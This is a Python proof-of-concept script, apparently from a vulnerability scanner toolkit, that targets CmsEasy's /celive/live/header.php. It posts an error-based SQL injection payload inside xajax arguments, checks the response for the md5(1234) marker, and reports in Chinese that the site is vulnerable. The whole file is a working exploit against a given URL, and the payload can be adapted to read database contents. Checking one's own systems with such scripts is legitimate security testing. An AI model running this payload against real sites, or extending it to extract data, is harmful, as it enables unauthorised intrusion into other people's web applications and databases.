#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/celive/live/header.php"


def main():
    res = HttpPost(url+payload,"xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx'AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT (ELT(1=1,md5(1234)))),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)AND'1'='1</q></xjxquery>","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find("81dc9bdb52d04dc20036dbd8313ed055")!= -1:
        print(Result+url+"存在cmseasy header.php 报错注入漏洞");


main()
